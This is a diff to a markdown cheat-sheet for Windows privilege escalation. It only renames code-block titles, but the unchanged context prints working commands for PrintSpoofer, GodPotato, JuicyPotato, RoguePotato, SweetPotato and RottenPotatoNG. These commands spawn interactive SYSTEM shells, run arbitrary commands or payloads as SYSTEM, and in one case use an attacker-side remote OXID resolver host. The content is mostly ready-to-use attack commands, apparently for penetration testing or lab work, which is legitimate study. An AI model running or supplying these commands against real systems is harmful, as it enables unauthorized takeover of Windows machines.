@@ -6,7 +6,7 @@
 
 Spawn an interactive SYSTEM shell when the Print Spooler impersonation path is available.
 
-```cmd title:"Interactive SYSTEM shell with PrintSpoofer"
+```cmd title:"Potato / PrintSpoofer Interactive SYSTEM shell with PrintSpoofer"
 PrintSpoofer.exe -i -c cmd
 ```
 <!-- cheat -->
@@ -15,7 +15,7 @@ PrintSpoofer.exe -i -c cmd
 
 Run a command as SYSTEM.
 
-```cmd title:"Execute command with PrintSpoofer"
+```cmd title:"Potato / PrintSpoofer Execute command with PrintSpoofer"
 PrintSpoofer.exe -c "$command"
 ```
 <!-- cheat
@@ -28,7 +28,7 @@ var command
 
 Execute a command as SYSTEM on targets vulnerable to the GodPotato COM/DCOM path.
 
-```cmd title:"Execute command with GodPotato"
+```cmd title:"Potato / PrintSpoofer Execute command with GodPotato"
 GodPotato.exe -cmd "$command"
 ```
 <!-- cheat
@@ -41,7 +41,7 @@ var command
 
 Run a command through JuicyPotato on older Windows builds where the original COM activation path works.
 
-```cmd title:"Execute command with JuicyPotato"
+```cmd title:"Potato / PrintSpoofer Execute command with JuicyPotato"
 JuicyPotato.exe -l $listen_port -p C:\Windows\System32\cmd.exe -a "/c $command" -t *
 ```
 <!-- cheat
@@ -53,7 +53,7 @@ var command
 
 Use a specific CLSID when the default one fails.
 
-```cmd title:"Execute payload with JuicyPotato CLSID"
+```cmd title:"Potato / PrintSpoofer Execute payload with JuicyPotato CLSID"
 JuicyPotato.exe -l $listen_port -p "$payload_path" -t * -c "$clsid"
 ```
 <!-- cheat
@@ -68,7 +68,7 @@ var clsid
 
 Run RoguePotato with a remote OXID resolver host.
 
-```cmd title:"Execute command with RoguePotato"
+```cmd title:"Potato / PrintSpoofer Execute command with RoguePotato"
 RoguePotato.exe -r $lhost -e "$command" -l $listen_port
 ```
 <!-- cheat
@@ -83,7 +83,7 @@ var listen_port
 
 Execute a prepared payload through SweetPotato.
 
-```cmd title:"Execute payload with SweetPotato"
+```cmd title:"Potato / PrintSpoofer Execute payload with SweetPotato"
 SweetPotato.exe -p "$payload_path"
 ```
 <!-- cheat
@@ -96,7 +96,7 @@ var payload_path
 
 Run RottenPotatoNG, then use token impersonation tooling in the same session.
 
-```cmd title:"Run RottenPotatoNG"
+```cmd title:"Potato / PrintSpoofer Run RottenPotatoNG"
 RottenPotatoNG.exe
 ```
 <!-- cheat -->
